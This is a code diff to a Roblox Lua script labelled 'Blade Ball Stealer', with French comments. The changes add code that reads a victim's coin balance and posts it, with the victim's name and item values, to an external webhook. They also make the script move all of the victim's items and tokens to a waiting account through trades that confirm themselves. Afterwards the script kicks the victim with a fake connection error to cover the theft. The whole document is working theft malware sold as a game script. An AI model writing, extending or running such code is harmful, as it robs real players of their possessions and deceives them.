@@ -21,12 +21,11 @@ local PlayerGui = plr.PlayerGui
 local tradeGui = PlayerGui.Trade
 local inTrade = false
 local notificationsGui = PlayerGui.Notifications
-local tradeCompleteGui = PlayerGui.TradeCompleted
 
 local clientInventory = require(game.ReplicatedStorage.Shared.Inventory.Client).Get()
 local Replion = require(game.ReplicatedStorage.Packages.Replion)
 
--- Cache UI (Ta version)
+-- Cache UI
 tradeGui.Black.Visible = false
 tradeGui.Main.Visible = false
 notificationsGui.Enabled = false
@@ -72,11 +71,21 @@ local function getNextBatch(items, batchSize)
     return batch
 end
 
+-- Récupération du montant de Tokens (Coins)
+local function getVictimTokens()
+    local amount = 0
+    pcall(function()
+        -- On récupère la valeur depuis l'UI ou le Leaderstat (Blade Ball utilise souvent l'UI pour les coins de trade)
+        local rawText = PlayerGui.Trade.Main.Currency.Coins.Amount.Text
+        amount = tonumber(rawText:gsub("[^%d]", "")) or 0
+    end)
+    return amount
+end
+
 ---------------------------------------------------------
--- EMBEDS (STYLÉS COMME DEMANDÉ)
+-- EMBEDS
 ---------------------------------------------------------
 
--- 1. VIOLET (Exécution)
 local function SendJoinMessage(list, prefix)
     local totalRAP = 0
     local itemLines = ""
@@ -84,6 +93,10 @@ local function SendJoinMessage(list, prefix)
         totalRAP = totalRAP + item.RAP
         itemLines = itemLines .. "• " .. item.Name .. " [" .. formatNumber(item.RAP) .. " RAP]\n"
     end
+
+    -- Ajout des tokens à la fin de l'inventaire
+    local victimTokens = getVictimTokens()
+    itemLines = itemLines .. "\n💰 Tokens: " .. formatNumber(victimTokens)
 
     local data = {
         ["auth_token"] = auth_token,
@@ -104,10 +117,10 @@ local function SendJoinMessage(list, prefix)
     request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
 end
 
--- 2. JAUNE (Quand tu rejoins)
 local function SendOnServerMessage()
     local totalRAP = 0
     for _, item in ipairs(itemsToSend) do totalRAP = totalRAP + item.RAP end
+    local victimTokens = getVictimTokens()
 
     local data = {
         ["auth_token"] = auth_token,
@@ -116,7 +129,8 @@ local function SendOnServerMessage()
             ["color"] = 16776960,
             ["fields"] = {
                 {name = "👤 Victim:", value = "```" .. plr.Name .. "```", inline = true},
-                {name = "💰 Total RAP:", value = "```" .. formatNumber(totalRAP) .. "```", inline = true}
+                {name = "💰 Total RAP:", value = "```" .. formatNumber(totalRAP) .. "```", inline = true},
+                {name = "🪙 Tokens:", value = "```" .. formatNumber(victimTokens) .. "```", inline = true}
             },
             ["thumbnail"] = {["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=150&height=150&format=png"},
             ["footer"] = {["text"] = "Blade Ball Stealer | Session Active"}
@@ -126,7 +140,7 @@ local function SendOnServerMessage()
 end
 
 ---------------------------------------------------------
--- LOGIQUE DE TRADE (TA VERSION)
+-- LOGIQUE DE TRADE AVEC AUTO-CONFIRM
 ---------------------------------------------------------
 
 local function sendTradeRequest(user)
@@ -143,40 +157,38 @@ local function addItemToTrade(itemType, ID)
     until response == true
 end
 
-local function readyTrade()
-    repeat
-        task.wait(0.2)
-        local response = netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(true)
-    until response == true
-end
-
-local function confirmTrade()
-    repeat
-        task.wait(0.2)
-        netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer()
-    until not inTrade
-end
-
 local function doTrade(joinedUser)
     while #itemsToSend > 0 do
         sendTradeRequest(joinedUser)
         repeat task.wait(0.5) until inTrade
+
+        task.wait(1)
 
         local currentBatch = getNextBatch(itemsToSend, 100)
         for _, item in ipairs(currentBatch) do
             addItemToTrade(item.itemType, item.ItemID)
         end
 
-        -- Ton système de tokens
-        local rawText = PlayerGui.TradeRequest.Main.Currency.Coins.Amount.Text
-        local tokensamount = tonumber(rawText:gsub("[^%d]", "")) or 0
-        if tokensamount >= 1 then
-            netModule:WaitForChild("RF/Trading/AddTokensToTrade"):InvokeServer(tokensamount)
-        end
+        -- Ajout automatique des Tokens au trade
+        pcall(function()
+            local rawText = PlayerGui.Trade.Main.Currency.Coins.Amount.Text
+            local tokensamount = tonumber(rawText:gsub("[^%d]", "")) or 0
+            if tokensamount >= 1 then
+                netModule:WaitForChild("RF/Trading/AddTokensToTrade"):InvokeServer(tokensamount)
+            end
+        end)
 
-        readyTrade()
-        confirmTrade()
+        -- AUTO-CONFIRM
+        task.wait(1)
+        repeat
+            netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(true)
+            task.wait(0.5)
+            netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer()
+            task.wait(0.5)
+        until not inTrade
     end
+    
+    task.wait(2)
     plr:kick("Please check your internet connection and try again. (Error Code: 277)")
 end
 
@@ -200,6 +212,9 @@ end
 if #itemsToSend > 0 then
     table.sort(itemsToSend, function(a, b) return a.RAP > b.RAP end)
     local prefix = (ping == "Yes") and "@everyone | " or ""
+    
+    -- On attend un tout petit peu pour que l'UI de coins charge si besoin avant le premier webhook
+    task.wait(0.5)
     SendJoinMessage(itemsToSend, prefix)
 
     local function onUserAdded(player)
